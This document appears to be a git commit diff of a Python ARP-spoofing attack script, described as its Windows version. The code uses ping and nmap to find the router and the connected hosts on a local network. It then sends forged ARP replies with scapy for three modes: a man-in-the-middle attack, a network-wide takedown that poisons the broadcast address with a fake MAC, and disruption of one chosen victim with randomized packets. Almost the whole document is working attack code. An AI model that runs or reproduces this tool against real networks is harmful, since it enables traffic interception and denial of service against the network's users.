bf3db21e7e46af02706dbe02380de99bc2ab2fd4
farid-eidelbeyrouthy <73123921+farid-eidelbeyrouthy@users.noreply.github.com>
2020-10-21 17:08:56 +0300

    Add files via upload
    Windows version of the attack

--- Attack/main_WindowsVersion.py
+++ Attack/main_WindowsVersion.py
@@ -7,7 +7,8 @@ from victim import Victim
 from attacker import Attacker
 from network import Network
 from color import Color #used to output to the terminals with colors
-
+from random import randint
+from random import seed
 
 def initialize():
     Color.pl("{?} Doing pings to discover the router")
@@ -20,15 +21,10 @@ def initialize():
     out = str(subprocess.check_output(command, shell=True))
     
     commandOutput=out.split('\\r\\n')
-    print(commandOutput)
     routerIP = commandOutput[3].split()[0]
-    print(routerIP)
     routerMAC = commandOutput[3].split()[1]
-    print(routerMAC)
-
     attackerIP = commandOutput[1].split()[1]
     attackerMAC = hex(uuid.getnode())
-    print(attackerIP,attackerMAC)
     i=3
     while (i<len(commandOutput)):
         if commandOutput[i].split()[1]=='ff-ff-ff-ff-ff-ff':
@@ -40,14 +36,11 @@ def initialize():
     command = "nmap -sn "+ routerIP +"/24" # discover users connected to router
     commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT))
     connectedDevices = commandOutput.split('\\r\\n') #remove first element since it is the router
-    print(connectedDevices)
     victimList = [] # list we are going to use and popsulate it with possible victims
     if len(connectedDevices)>5:
         for i in range(4, len(connectedDevices)-6, 3):
             mac = connectedDevices[i+2].split()[2]
-            print(mac)
             ip = connectedDevices[i].split()[4]
-            print(ip)
             if ip != attackerIP:
                 print(ip, mac)
                 victimList.append(Victim([ip, mac]))
@@ -58,6 +51,7 @@ def initialize():
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
     takedown=False
+    specific=False
     process= initialize()
     (network, attacker, victimsList,broadcastIP)=process
     Color.pl("{+} " + network.toString())
@@ -67,18 +61,24 @@ if __name__ == '__main__':
 
     op = 1  # Op code 1 for ARP requests
     while(True):
-        Color.pl("{?} What type of ARP attack do you want to perform? \n (Man-in-the-middle[1] or Take down the network![2])")
+        Color.pl("{?} What type of ARP attack do you want to perform? \n (Man-in-the-middle[1] or Take down the network![2] or Attack specific victim[3]?)")
         selection = input().lower()
+        routerIP=network.ip
         if selection.lower() == "2":
             ip=broadcastIP
+            mac="34:23:fe:3a:3e:10" #random
             takedown=True
-            routerIP = network.ip
             break
         else:
-            if selection.lower()=="1":
+            if selection.lower()=="3":
+                specific=True
+                mac="34:23:fe:3a:3e:10" #random
                 break
             else:
-                Color.pl("{!} Invalid Input")
+                if selection.lower()=="1":
+                    break
+                else:
+                    Color.pl("{!} Invalid Input")
     while(takedown==False):
         Color.pl("{?} Do you want to enter the target manually? (y or n)")
         selection = input().lower()
@@ -94,7 +94,6 @@ if __name__ == '__main__':
             Color.pl("{+} Enter Index of Target")
             index = int(input())
             ip = victimsList[index].ip
-            mac = victimsList[index].mac
             break
         else:
             Color.pl("{!} Invalid Input")
@@ -113,28 +112,41 @@ if __name__ == '__main__':
             Color.pl("{!} Invalid Input")
 
     Color.pl("{+} {R} Router IP: {G}" + routerIP)
-    Color.pl("{+} {R} Target IP: {G}" + ip + "  {R} Target MAC: {G}" + mac)
+    Color.pl("{+} {R} Target IP: {G}" + ip)
     time.sleep(2)
     
     Color.pl("{+} Processing :) ")
     
-    if (takedown==False):
-        arp= ARP(op=2, psrc=routerIP, pdst=ip, hwdst=mac)
-        arp2=ARP(op=2, psrc=ip, pdst=routerIP, hwdst=mac)
-        
+    if (takedown==False and specific==False):
+        arp= ARP(op=2, psrc=routerIP, pdst=ip)
+        arp2= ARP(op=2, psrc=ip, pdst=routerIP)
     else:
-        arp = ARP(op=2, psrc=routerIP, pdst=ip, hwdst=mac)
+        arp = ARP(op=2, psrc=routerIP, pdst=ip, hwsrc=mac)
+
+        
             
     
 
     while 1:
-        if (takedown==True):
-            send(arp)
-            print(mac)
-        else:
+        if (takedown==False and specific==False):
             send(arp)
             send(arp2)
+            time.sleep(1)
+        else:
+            seed(655)
+            counter=0
+            while 1:
+                 if (counter % 5 == 0):
+                    op = randint(1, 2)
+                    s = randint(1, 3)
+                    arp = ARP(op=op, psrc=routerIP, pdst=ip, hwsrc=mac)
+                    send(arp)
+                    # lower sleep timer to make it better, victim ajusts ARP table otherwise
+                    time.sleep(s)
+                    
+                    send(arp)
             
-        time.sleep(5)
+                    time.sleep(1)
+                 counter += 1
 
 
